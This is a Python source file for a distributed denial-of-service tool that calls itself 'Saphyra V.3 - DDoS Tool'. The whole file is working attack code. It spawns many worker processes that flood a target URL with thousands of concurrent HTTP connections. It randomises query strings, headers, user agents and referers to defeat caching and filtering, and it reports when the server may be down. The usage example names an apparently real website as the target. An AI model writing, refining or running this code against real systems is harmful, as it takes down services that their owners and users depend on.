#!/usr/bin/env python

from multiprocessing import Process, Manager, Pool
import urllib.parse as urlparse
import ssl
import sys
import getopt
import random
import time
import os
import random

if sys.version_info < (3,0):
    import http.client as HTTPCLIENT
else:
    import http.client as HTTPCLIENT

DEBUG = False

METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 50
DEFAULT_SOCKETS = 4000

with open('lists/useragents.txt') as f:
    USER_AGENT_PARTS = f.readlines()

class Saphyra(object):

    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down Saphyra")

    def __del__(self):
        self.exit()

    def printHeader(self):
        print()

    # Do the fun!
    def fire(self):
        self.printHeader()
        print("MODE: '{0}' - WORKERS: {1}  - CONNECTIONS: {2} ".format(self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print("Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method
                self.workersQueue.append(worker)
                worker.start()
            except Exception as e:
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print("Initiating monitor")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print("{0} Saphyra strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1]))

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")

                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except:
            pass

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print("Killing worker {0}".format(worker.name))
                        worker.stop()
                    except Exception as ex:
                        pass
                if DEBUG:
                    raise
                else:
                    pass

class Striker(Process):

    # Counters
    request_count = 0
    failed_count = 0

    # Containers
    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    # Flags
    runnable = True

    # Options
    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):
        super(Striker, self).__init__()
        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == 'https':
            self.ssl = True

        self.host = parsedUrl.netloc.split(':')[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443

        self.referers = [
            'http://www.google.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            'http://' + self.host + '/'
        ]

    def __del__(self):
        self.stop()

    def buildblock(self, size):
        out_str = ''

        validChars = list(range(97, 123)) + list(range(65, 91)) + list(range(48, 58))

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str

    def run(self):
        if DEBUG:
            print("Starting worker {0}".format(self.name))

        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:
                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:
                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
            except Exception as e:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass

        if DEBUG:
            print("Worker {0} completed run. Sleeping...".format(self.name))

    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass

    def createPayload(self):
        req_url, headers = self.generateData()

        random_keys = list(headers.keys())
        random.shuffle(random_keys)
        random_headers = {}

        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount=1):
        queryString = []
        for i in range(ammount):
            key = self.buildblock(random.randint(3, 10))
            value = self.buildblock(random.randint(3, 20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)
        return '&'.join(queryString)

    def generateData(self):
        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = '/'

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)
        http_headers = self.generateRandomHeaders()

        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner='?'):
        return self.url + param_joiner + self.generateQueryString(random.randint(1, 5))

    def getUserAgent(self):
        if self.useragents:
            return random.choice(self.useragents)
        return ""

    def generateRandomHeaders(self):
        noCacheDirectives = ['no-cache', 'max-age=0']
        random.shuffle(noCacheDirectives)
        nrNoCache = random.randint(1, (len(noCacheDirectives) - 1))
        noCache = ', '.join(noCacheDirectives[:nrNoCache])

        acceptEncoding = ['\'\'', '*', 'identity', 'gzip', 'deflate']
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(1, len(acceptEncoding) // 2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            'User-Agent': self.getUserAgent(),
            'Cache-Control': noCache,
            'Accept-Encoding': ', '.join(roundEncodings),
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1, 1000),
            'Host': self.host,
        }

        if random.randrange(2) == 0:
            acceptCharset = ['ISO-8859-1', 'utf-8', 'Windows-1251', 'ISO-8859-2', 'ISO-8859-15']
            random.shuffle(acceptCharset)
            http_headers['Accept-Charset'] = '{0},{1};q={2},*;q={3}'.format(
                acceptCharset[0], acceptCharset[1], round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            url_part = self.buildblock(random.randint(5, 10))
            random_referer = random.choice(self.referers) + url_part

            if random.randrange(2) == 0:
                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))

            http_headers['Referer'] = random_referer

        if random.randrange(2) == 0:
            http_headers['Content-Type'] = random.choice(['multipart/form-data', 'application/x-url-encoded'])

        if random.randrange(2) == 0:
            http_headers['Cookie'] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    def incCounter(self):
        try:
            self.counter[0] += 1
        except:
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except:
            pass

def usage():
    print('Usage: Saphyra (url)')
    print('Example: Saphyra.py http://luthi.co.il/')
    print("\a")

print (\
"""

                                ,-.
                               ( O_)
                              / `-/
                             /-. /
                            /   )
                           /   /  
              _           /-. /
             (_)*-._     /   )
               *-._ *-'**( )/    
                   *-/*-._* `. 
                    /     *-.'._
                   /\       /-._*-._
    _,---...__    /  ) _,-*/    *-(_)
___<__(|) _   **-/  / /   /
 '  `----' **-.   \/ /   /
               )  ] /   /
       ____..-'   //   /                       )
   ,-**      __.,'/   /   ___                 /,
  /    ,--**/  / /   /,-**   ***-.          ,'/
 [    (    /  / /   /  ,.---,_   `._   _,-','
  \    `-./  / /   /  /       `-._  *** ,-'
   `-._  /  / /   /_,'            **--*
       */  / /   /*         
       /  / /   /
      /  / /   /  
     /  |,'   /  
    :   /    /
    [  /   ,'     ~>Saphyra V.3 - DDoS Tool<~
    | /  ,'    
    |/,-'
    '
                                                       
""")
    
def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg + "\n"))
    usage()
    sys.exit(2)

def main():
    try:
        if len(sys.argv) < 2:
            error('Please supply at least the URL')

        url = sys.argv[1]

        if url == '-h':
            usage()
            sys.exit()

        if url[0:4].lower() != 'http':
            error("Invalid URL supplied")

        if url is None:
            error("No URL supplied")

        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:",
                                   ["debug", "help", "workers", "sockets", "method", "useragents"])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        uas_file = None
        useragents = []

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-u", "--useragents"):
                uas_file = a
            elif o in ("-s", "--sockets"):
                socks = int(a)
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            elif o in ("-m", "--method"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '" + o + "' doesn't exists")

        if uas_file:
            try:
                with open(uas_file) as f:
                    useragents = f.readlines()
            except IOError:
                error("Cannot read file {0}".format(uas_file))

        saphyra = Saphyra(url)
        saphyra.useragents = useragents
        saphyra.nr_workers = workers
        saphyra.method = method
        saphyra.nr_sockets = socks

        saphyra.fire()

    except (getopt.GetoptError, Exception) as e:
        sys.stderr.write(str(e))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
